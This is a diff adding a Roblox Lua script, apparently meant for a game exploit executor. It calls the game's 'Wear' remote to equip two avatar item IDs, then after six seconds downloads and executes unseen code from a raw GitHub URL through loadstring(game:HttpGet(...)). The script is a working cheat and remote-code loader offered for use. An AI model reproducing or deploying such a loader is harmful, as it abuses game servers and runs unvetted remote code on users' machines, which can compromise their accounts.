@@ -1,0 +1,35 @@
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- IDs dos Noob Arms
+local noobArms = {84451219120140, 72292903231768}
+
+-- Função para equipar via Remote
+local function equipNoobArms()
+    for _, id in ipairs(noobArms) do
+        local success, err = pcall(function()
+            ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(id)
+        end)
+        if success then
+            print("Noob Arm ID "..id.." equipado com sucesso!")
+        else
+            warn("Falha ao equipar Noob Arm ID "..id.." | "..tostring(err))
+        end
+    end
+end
+
+-- Equipar imediatamente
+equipNoobArms()
+
+-- Após 6 segundos, executar script externo
+task.delay(6, function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty45.lua"))()
+    end)
+    if success then
+        print("Script externo executado com sucesso!")
+    else
+        warn("Falha ao executar script externo: "..tostring(err))
+    end
+end)
